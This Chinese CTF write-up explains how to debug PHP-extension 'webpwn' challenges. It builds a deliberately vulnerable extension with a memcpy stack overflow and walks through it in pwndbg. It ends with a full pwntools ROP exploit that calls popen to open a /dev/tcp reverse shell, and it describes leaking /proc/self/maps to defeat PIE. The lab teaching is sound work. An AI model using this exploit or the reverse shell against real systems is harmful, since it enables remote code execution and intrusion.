# WEBPWN入门级调试讲解

阅读量 **474572**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-05-08 15:30:26

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 前言

五一的假期整好赶上De1CTF,结果就是又被大师傅们吊打了，遇见一道WEBPWN，WEBPWN类型的题，网上资料相对较少，而且调试过程也基本没有记录，借此机会又学习了一波，记录一下

## 前置知识

###  WEBPHP介绍

WEBPWN类型的题目，目前大部分多为PHPPWN，其实就是PHP加载外部扩展，核心漏洞点在so扩展库中，由于是php加载扩展库来调用其内部函数，所以和常规PWN题最大的不同点，就是不能直接获得交互式shell，与常规PWN题相同的，对于栈溢出漏洞来说，依然是采用ROP链的方式来绕过NX，然后最后进行的攻击效果是期望获得能反弹到vps上的交互式shell，这里大部分可以采用popen,或者exec函数族来进行执行bash命令来反弹出shell，直接执行one_gadget或者system是不太可行的。

###  PHPPWN相关前置知识点

要解决PHPPWN类型的题目，我们就得先了解一下PHP扩展。  
在Linux环境下，PHP扩展通常为.so文件，扩展模块放置的路径我们可以通过下面的方式来查看

    
    
    $> php -i | grep -i extension_dir
    extension_dir => /usr/lib/php/20170718 => /usr/lib/php/20170718
    

扩展模块的生命周期：

>   1. Module init 即MINIT  
>
>

>> PHP解释器启动，加载相关模块，在此时调用相关模块的MINIT方法，仅被调用一次

>
>   2. Request init 即RINIT  
>
>

>> 每个请求达到时都被触发。SAPI层将控制权交由PHP层，PHP初始化本次请求执行脚本所需的环境变量，函数列表等，调用所有模块的RINIT函数。

>
>   3. Request shutdown 即RSHUTDOWN  
>
>

>> 请求结束，PHP就会自动清理程序，顺序调用各个模块的RSHUTDOWN方法，清除程序运行期间的符号表。

>
>   4. Module shutdown 即MSHUTDOWN  
>
>

>> 服务器关闭，PHP调用各个模块的MSHUTDOWN方法释放内存。

>
>

PHP的生命周期常见如下几种：

>   1. 单进程SAPI生命周期
>   2. 多进程SAPI生命周期
>   3. 多线程SAPI声明周期
>

CLI运行模式:

>
> 通常我们在开发PHP扩展时，多是用命令行终端来直接使用php解释器直接解释执行.php文件，在.php文件中我们写入需要调用的扩展函数，该扩展函数被编译在.so的扩展模块中，这种运行模式我一般称为`CLI模式`，该模式对应的php声明周期一般为`单进程SAPI生命周期`

CGI运行模式

>
> 其中对于大部分网站应用服务器来说，大部分时候PHP解释器运行的模式为`CGI模式——单进程SAPI生命周期`，此模式运行特点为请求到达时，`为每个请求fork一个进程，一个进程只对一个请求做出响应`，请求结束后，进程也就结束了。其中fork的进程，和原进程的内存布局一般来说是一模一样的，所以这里如果能拿到`/proc/{pid}/maps`文件，则可以拿到该进程的内存布局，形成内存泄露，此方式在De1CTF中的这道WEBPWN上是第一个突破点，利用的其有漏洞的包含函数来读取`/proc/self/maps`，可以拿到所有基地址，从而无视PIE保护。

## PHP扩展模块开发流程

经过上部分的简单介绍，我们大概了解了PHP的扩展模块，下面我们简要介绍一下PHP扩展模块的开发流程。  
我本机的环境是Ubuntu18.04，我们使用下面的命令来简单的搭建开发环境

    
    
    # 安装php，以及php开发包头
    $> sudo apt install php php-dev
    $> php -v # 查看php版本
    PHP 7.2.24-0ubuntu0.18.04.4 (cli) (built: Apr  8 2020 15:45:57) ( NTS )
    Copyright (c) 1997-2018 The PHP Group
    Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
        with Zend OPcache v7.2.24-0ubuntu0.18.04.4, Copyright (c) 1999-2018, by Zend Technologies
    

我的版本为7.2.24，之后我们去[php的github的源代码发布页面](https://github.com/php/php-src/releases)上下载相同版本的源代码。

    
    
    php-7.2.24
      |____build    --和编译有关的目录，里面包括wk，awk和sh脚本用于编译处理，其中m4文件是linux下编译程序自动生成的文件，可以使用buildconf命令操作具体的配置文件。
      |____ext      --扩展库代码，例如Mysql，gd，zlib，xml，iconv 等我们熟悉的扩展库，ext_skel是linux下扩展生成脚本，windows下使用ext_skel_win32.php。
      |____main     --主目录，包含PHP的主要宏定义文件，php.h包含绝大部分PHP宏及PHP API定义。
      |____netware  --网络目录，只有sendmail_nw.h和start.c，分别定义SOCK通信所需要的头文件和具体实现。
      |____pear     --扩展包目录，PHP Extension and Application Repository。
      |____sapi     --各种服务器的接口调用，如Apache，IIS等。
      |____scripts  --linux下的脚本目录。
      |____tests    --测试脚本目录，主要是phpt脚本，由--TEST--，--POST--，--FILE--，--EXPECT--组成，需要初始化可添加--INI--部分。
      |____TSRM     --线程安全资源管理器，Thread Safe Resource Manager保证在单线程和多线程模型下的线程安全和代码一致性。
      |____win32    --Windows下编译PHP 有关的脚本。
      |____Zend     --包含Zend引擎的所有文件，包括PHP的生命周期，内存管理，变量定义和赋值以及函数宏定义等等。
    

扩展模块开发  
首先我们进入源代码目录，使用如下目录生成扩展模块的工程项目

    
    
    $>./ext_skel --extname=easy_phppwn
    

之后我们编写一个扩展函数，这是一个简单栈溢出演示，如下图所示：

![](https://p1.ssl.qhimg.com/t0108f955e8c81588c7.png)

同时在下方如图所示位置配置该扩展函数

![](https://p1.ssl.qhimg.com/t017ab231afac2e6bce.png)

写完之后我们使用如下命令配置编译

    
    
    $> ./configure --with-php-config=/usr/bin/php-config
    

然后在生成的Makefile文件中，在如下位置设置编译参数，记得`取消-O2`优化，否则会加上`FORTIFY`保护，导致memcpy函数加上长度检查变为`__memcpy_chk`函数

![](https://p5.ssl.qhimg.com/t0187b2874ff2e85f37.png)

设置好之后我们可以直接使用`make`命令编译，编译完成后，会生成`./modules`，目录下就是我们需要的.so扩展文件，将其复制到，php扩展目录下，之后再php.ini文件中配置启动扩展即可，

    
    
    # 通过find命令来查找 php.ini文件
    $> sudo find / -name "php.ini"
    /etc/php/7.2/apache2/php.ini
    /etc/php/7.2/cli/php.ini    # 通常我调试时使用CLI模式，所以我只配置了该目录下的php.ini文件
    

在最下方加入

    
    
    extension=easy_phppwn.so #easy_phppwn.so是扩展模块的文件名，应放在php的扩展模块目录下，在文章开头，有查找指令
    

完成之后，我们写一个.php文件，尝试调用phpinfo()函数进行查看

    
    
    $> php test.php | grep "easy_phppwn" #test.php中仅一个phpinfo()函数
    easy_phppwn
    easy_phppwn support => enabled
    PWD => /home/pwn/Desktop/phppwn/easy_phppwn
    $_SERVER['PWD'] => /home/pwn/Desktop/phppwn/easy_phppwn
    

至此，我们完成了一个简单php扩展模块的开发，以及具备了调试了phppwn的环境。

## PHP扩展模块的调试即PHPPWN的调试

我们直接使用IDA打开该扩展模块文件

    
    
    void __cdecl zif_easy_phppwn(zend_execute_data *execute_data, zval *return_value)
    {
      char buf[100]; // [rsp+10h] [rbp-80h]
      size_t n; // [rsp+80h] [rbp-10h]
      char *arg; // [rsp+88h] [rbp-8h]
    
      arg = 0LL;
    //   zend_parse_parameters 是zend引擎解析我们使用php调用改函数时传入的字符串，s代表以字符串的形式解析，&arg是参数的地址，&n是解析后的参数长度
      if ( (unsigned int)zend_parse_parameters(execute_data->This.u2.next, "s", &arg, &n) != -1 )
      {
    // 所以实际上这里有两次可溢出，一处是arg，一处是buf
        memcpy(buf, arg, n);
        php_printf("The baby phppwn.n");
      }
    }
    

由于保护机制中开启了NX，所以我们依然采用rop的方式绕过  
下面是具体的调试过程

首先我们写一个php文件，其中调用改easy_phppwn函数，如下：

    
    
    // easy.php
    <?php
    
    $a = "abcd";
    easy_phppwn($a);
    ?>
    

之后在终端中我们执行该文件:

    
    
    $> php easy.php
    The baby phppwn.
    

成功输出，则说明该扩展函数成功被调用  
下面我们使用gdb来调试，这里我们主要测试memcpy导致的buf变量溢出，首先我编写了一个exp.py文件来生成带payload的.php文件，如下：

    
    
    # exp.py
    from pwn import *
    
    def create_php(buf):
        with open("pwn.php", 'w+') as pf:
            pf.write('''<?php
    easy_phppwn(urldecode("%s"));
    ?>'''%urlencode(buf))
    
    
    buf = 'a'*0x80
    buf += 'b'*0x10
    
    create_php(buf)
    

运行exp

    
    
    $> python exp.py
    $> php pwn.php
    The baby phppwn.
    [1]    23692 segmentation fault (core dumped)  php pwn.php
    

说明成功触发栈溢出，现在我们使用gdb来进行调试，首先我这里假设我们之前在漏洞网站上已经泄露了maps文件已经获得了php进程的内存布局，所以我这里先关闭了本地随机化

    
    
    $>gdb php
    pwndbg> run
    Starting program: /usr/bin/php 
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    

运行run以后，php在等待我们的输入，我们直接`ctrl+c` 终止掉程序，但是这里是不会退出gdb的，而是如下所示:

    
    
    Program received signal SIGINT
    pwndbg>
    

查看vmmap

    
    
    pwndbg>vmmap
    ...
        0x7ffff28f4000     0x7ffff28f5000 r-xp     1000 0      /usr/lib/php/20170718/easy_phppwn.so
        0x7ffff28f5000     0x7ffff2af5000 ---p   200000 1000   /usr/lib/php/20170718/easy_phppwn.so
        0x7ffff2af5000     0x7ffff2af6000 r--p     1000 1000   /usr/lib/php/20170718/easy_phppwn.so
        0x7ffff2af6000     0x7ffff2af7000 rw-p     1000 2000   /usr/lib/php/20170718/easy_phppwn.so
    ...
    

这里我们已经可以看到php 已经加载了 easy_phppwn.so  
所以我们现在可以设置断点了，如果在run之前设置会提示找不到该函数，设置断点我们需要设置真正的函数名，其实是`zif_funcname`，也就是我们在ida中看到的函数名，这里就是`zif_easy_phppwn`，同时设置参数为之前生成的pwn.php文件

    
    
    pwndbg>break zif_easy_phppwn
    pwndbg>set args ./pwn.php
    pwndbg>run
    ...
    Breakpoint zif_easy_phppwn
    pwndbg>
    

如果成功，则说明我们现在已经进入了该函数，现在我们可以开始进行调试rop链了，对了，如果该扩展是在本地编译的话是有源码的，所以这里可以直接进行源码级别的调试

    
    
    ...
    ────────────[ DISASM ]────────
     ► 0x7ffff28f4c46 <zif_easy_phppwn+25>    mov    qword ptr [rbp - 8], 0
       0x7ffff28f4c4e <zif_easy_phppwn+33>    mov    rax, qword ptr [rbp - 0x88]
       0x7ffff28f4c55 <zif_easy_phppwn+40>    mov    eax, dword ptr [rax + 0x2c]
       0x7ffff28f4c58 <zif_easy_phppwn+43>    mov    edi, eax
       0x7ffff28f4c5a <zif_easy_phppwn+45>    lea    rdx, [rbp - 0x10]
       0x7ffff28f4c5e <zif_easy_phppwn+49>    lea    rax, [rbp - 8]
       0x7ffff28f4c62 <zif_easy_phppwn+53>    mov    rcx, rdx
       0x7ffff28f4c65 <zif_easy_phppwn+56>    mov    rdx, rax
       0x7ffff28f4c68 <zif_easy_phppwn+59>    lea    rsi, [rip + 0xe5]
       0x7ffff28f4c6f <zif_easy_phppwn+66>    mov    eax, 0
       0x7ffff28f4c74 <zif_easy_phppwn+71>    call   zend_parse_parameters@plt <0x7ffff28f4a20>
    ────────────[ SOURCE (CODE) ]────────
    In file: /home/pwn/Desktop/phppwn/php-src-php-7.2.24/ext/easy_phppwn/easy_phppwn.c
       71    function definition, where the functions purpose is also documented. Please
       72    follow this convention for the convenience of others editing your code.
       73 */
       74 PHP_FUNCTION(easy_phppwn)
       75 {
     ► 76   char *arg = NULL;
       77   size_t arg_len, len;
       78   char buf[100];
       79   if (zend_parse_parameters(ZEND_NUM_ARGS(), "s", &arg, &arg_len) == FAILURE) {
       80           return;
       81   }
    ────────────[ STACK ]────────
    ...
    

这样我们就可以愉快的进行调试了，当然开篇我已经提到，phppwn题目来说，是基本没法使用one_gadget,system(‘/bin/sh’)来直接获取交互式shell的，所以我这里通过使用popenv来开启一个反弹shell到vps上，当然其实还可以使用rop链构造调用`mprotect`函数来给stack执行权限，然后找一个`jmp
rsp`来直接执行shellcode，这样就不用去算栈偏移了，不过也差不多。

完整exp如下：

    
    
    from pwn import *
    
    context.arch = "amd64"
    
    def create_php(buf):
        with open("pwn.php", 'w+') as pf:
            pf.write('''<?php
    easy_phppwn(urldecode("%s"));
    ?>'''%urlencode(buf))
    
    libc = ELF("./libc-2.27.so")
    
    libc.address = 0x7ffff5e25000
    
    pop_rdi_ret = 0x2155f+libc.address
    pop_rsi_ret = 0x23e6a+libc.address
    popen_addr = libc.sym['popen']
    
    command = '/bin/bash -c "/bin/bash -i >&/dev/tcp/127.0.0.1/6666 0>&1"'
    
    stack_base = 0x7ffffffde000
    stack_offset = 0x1c330
    stack_addr = stack_offset+stack_base
    layout = [
        'a'*0x88,
        pop_rdi_ret,
        stack_addr+0x88+0x30+0x60,
        pop_rsi_ret,
        stack_addr+0x88+0x28,
        popen_addr,
        'r'+'x00'*7,
        'a'*0x60,
        command.ljust(0x60, 'x00'),
        "a"*0x8
    ]
    buf = flat(layout)
    
    create_php(buf)
    

最终效果如下：

![](https://p2.ssl.qhimg.com/t0194ed15f125a4e4d2.png)

## 总结

其实webpwn类型的题目，对大部分选手来说，主要可能是难在调试环节上，网上基本没有详细介绍的文章，de1CTF那道webpwn，我本地打通了，但是由于libc的问题，导致服务没打通，有点可惜了，这里借此记录一下我个人调试的流程方法，分享给各位师傅。

## 参考

[Wupco’s Blog-phppwn入门](http://www.wupco.cn/?p=4504)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **RGDZ** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/204404](/post/id/204404)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)
  * [webpwn](/tag/webpwn)

 **+1** __14赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=icQHyTbnCw83AY7RmP2fGHQ&s=40&t=1569897731)
RGDZ

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

